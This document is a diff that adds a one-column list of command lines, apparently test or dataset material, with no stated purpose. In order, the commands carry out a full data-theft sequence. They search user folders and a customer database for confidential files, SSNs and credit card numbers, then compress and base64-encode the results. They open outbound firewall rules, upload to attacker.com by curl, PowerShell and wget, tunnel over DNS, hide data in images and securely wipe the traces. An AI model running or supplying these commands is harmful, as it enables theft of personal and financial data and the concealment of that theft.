@@ -1,0 +1,28 @@
+commandline
+"dir C:\Users\ /s /b | findstr ""*.pdf *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.txt *.rtf"""
+"powershell -Command ""Get-ChildItem -Path C:\ -Include *.pdf,*.doc*,*.xls*,*.ppt*,*.txt -Recurse | Where-Object {$_.Length -gt 100KB}"""
+"findstr /s /m ""confidential"" C:\Users\*.docx"
+"findstr /s /m ""credit card"" C:\Users\*.txt"
+"sqlcmd -S localhost -d master -Q ""SELECT name FROM sys.databases"""
+"sqlcmd -S dbserver -d CustomerDB -Q ""SELECT TOP 10 * FROM Customers"""
+"sqlcmd -S dbserver -d CustomerDB -Q ""SELECT SSN, CreditCardNumber FROM FinancialRecords"" -o C:\temp\db_dump.txt"
+"powershell Compress-Archive -Path ""C:\Users\Documents\*.pdf"" -DestinationPath C:\temp\documents.zip"
+7z a -pstrong_password C:\temp\sensitive_data.7z C:\Users\*\*.docx
+tar -czf C:\temp\personal_data.tar.gz C:\Users\Public\*
+certutil -encode C:\temp\sensitive_data.zip C:\temp\encoded_data.b64
+"powershell -Command ""[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\temp\financial_records.xlsx'))"" > C:\temp\encoded_file.txt"
+net use Z: \\192.168.1.100\exfil_share /user:anonymous password
+"netsh advfirewall firewall add rule name=""AllowOutboundFTP"" dir=out action=allow protocol=TCP localport=21"
+"netsh advfirewall firewall add rule name=""AllowOutboundHTTP"" dir=out action=allow protocol=TCP localport=80"
+ftp -s:upload_script.txt 192.168.1.100
+"curl -X POST -F ""file=@C:\temp\documents.zip"" http://attacker.com/upload.php"
+"powershell (New-Object System.Net.WebClient).UploadFile('http://attacker.com/upload.php', 'C:\temp\encoded_data.b64')"
+wget --post-file=C:\temp\db_dump.txt http://attacker.com/receive.php
+dnscat2-client attacker.com --exec ping.exe
+iodine -f -P password attacker.com
+hping3 -c 10000 -d 100 -E C:\temp\data.txt -s 12345 -p 80 -k attacker.com
+copy /b image.jpg + C:\temp\sensitive_data.zip stego_image.jpg
+"outguess -k ""password"" -d C:\temp\compressed_data.txt stego_image.jpg"
+cipher /w:C:\temp
+sdelete -p 3 C:\temp\original_files\*
+fsutil file createnew C:\temp\dummy_file.dat 104857600 && del C:\temp\dummy_file.dat
